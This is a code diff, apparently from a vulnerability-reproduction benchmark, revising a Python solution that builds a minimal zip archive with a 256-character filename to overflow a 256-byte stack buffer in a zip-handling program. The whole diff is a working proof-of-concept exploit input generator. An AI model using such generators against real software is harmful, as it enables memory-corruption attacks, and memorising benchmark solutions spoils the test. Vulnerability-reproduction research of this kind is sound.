@@ -12,22 +12,34 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability description states a stack buffer of 256 bytes is used
-        # to store a filename from a zip archive. Providing a filename longer than
-        # 256 bytes will cause a stack buffer overflow.
-        # We choose a filename length of 257, which is the smallest length that
-        # triggers the overflow, to keep the PoC size minimal.
-        long_filename = 'A' * 257
+        # The vulnerability is a stack buffer overflow due to an unguarded copy
+        # of a filename into a 256-byte stack buffer. To trigger this, we need
+        # to create a zip archive containing a file with a name longer than
+        # 255 characters. The `strcpy` like function will copy the filename plus
+        # a null terminator, overflowing the buffer.
 
-        # The PoC will be a zip archive created in memory.
-        zip_buffer = io.BytesIO()
+        # To achieve the highest score, the PoC should be as small as possible.
+        # The smallest filename that causes an overflow is 256 characters long.
+        # This will result in 257 bytes being written (256 for the name + 1 for
+        # the null terminator), overflowing the 256-byte buffer by one byte.
+        overflow_filename_length = 256
+        poc_filename = 'A' * overflow_filename_length
 
-        # We create a zip file containing a single entry with the long filename.
-        # Using ZIP_STORED (no compression) and empty file content helps to
-        # minimize the overall size of the generated PoC file, which is beneficial
-        # for the scoring formula.
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
-            zf.writestr(long_filename, b'')
+        # The content of the file is irrelevant to this specific vulnerability.
+        # Using empty content minimizes the overall size of the PoC.
+        poc_content = b''
 
-        # Return the generated zip archive as a bytes object.
-        return zip_buffer.getvalue()
+        # We will construct the zip file in memory to avoid disk I/O.
+        mem_zip = io.BytesIO()
+
+        # The zipfile module is used to create the archive.
+        # We use ZIP_STORED (no compression) for simplicity and to ensure the
+        # smallest possible file size for empty content.
+        with zipfile.ZipFile(mem_zip, 'w', compression=zipfile.ZIP_STORED) as zf:
+            zf.writestr(poc_filename, poc_content)
+
+        # After the `with` block, the zip file is fully written to the
+        # in-memory buffer. We retrieve the bytes to return as the PoC.
+        poc_bytes = mem_zip.getvalue()
+
+        return poc_bytes
